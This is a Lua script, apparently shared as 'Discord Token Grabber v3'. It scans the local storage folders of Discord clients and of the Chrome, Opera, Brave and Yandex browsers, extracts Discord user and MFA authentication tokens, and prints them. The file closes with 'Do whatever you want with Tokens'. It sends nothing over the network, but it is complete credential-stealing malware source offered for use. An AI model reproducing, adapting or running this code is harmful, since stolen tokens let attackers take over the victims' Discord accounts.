-- Discord Token Grabber v3 Script by HexaG0n
-- This will only grab the tokens,
-- It will not send it to any webhook.
-- 27/7/2021

function getDiscordTokens(path)

    local function listDir(path)
        return io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
    end

    local function getToken(path)
        -- Reads the .ldb files in hexadecimal bytes
        local read = io.open(path, 'rb'):read('*a'):gsub('.', function(c)
        return string.format('%02X', c:byte()) end)
        local tokens = ''

        -- Matches user token
        for tok in read:gmatch('22'..('%w'):rep(48)..'2E'..('%w'):rep(12)..'2E'..('%w'):rep(54)..'22') do
            if tok ~= nil then
                tok = tok:gsub('..', function(c)
                return string.char(tonumber(c, 16)) end):sub(2, -2)

                tokens = tokens..tok..'\n'
            end
        end

        -- Matches mfa token
        for mfa in read:gmatch('226D66612E'..('%w'):rep(168)..'22') do
            if mfa ~= nil then
                mfa = mfa:gsub('..', function(c)
                return string.char(tonumber(c, 16)) end):sub(2, -2)

                tokens = tokens..mfa..'\n'
            end
        end

        if tokens ~= nil or tokens ~= '' then
            return tokens
        end
    end

    local path = path..'\\Local Storage\\leveldb\\'
    local files = listDir(path)
    local tokens = ''

    if files ~= '' then
        for file in files:gmatch('[^\r\n]+') do

            if file:find('.ldb') ~= nil then
                tokens = tokens..getToken(path..file)
            end

        end
        return tokens:sub(1, -2)
    end
end

-- Main

LocalAppData = os.getenv('localappdata')
Roaming = os.getenv('appdata')
Tokens = ''

PATH = {
    ['Discord'] = Roaming..'\\Discord',
    ['Discord Canary'] = Roaming..'\\discordcanary',
    ['Discord PTB'] = Roaming..'\\discordptb',
    ['Google Chrome'] = LocalAppData..'\\Google\\Chrome\\User Data\\Default',
    ['Opera'] = Roaming..'\\Opera Software\\Opera Stable',
    ['Brave'] = LocalAppData..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    ['Yandex'] = LocalAppData..'\\Yandex\\YandexBrowser\\User Data\\Default'
    }

for i,v in pairs(PATH) do
    if getDiscordTokens(v) ~= nil then
        Tokens = Tokens..getDiscordTokens(v)..'\n'
    end
end
Tokens = Tokens:sub(1, -2)

print(Tokens)
-- Do whatever you want with Tokens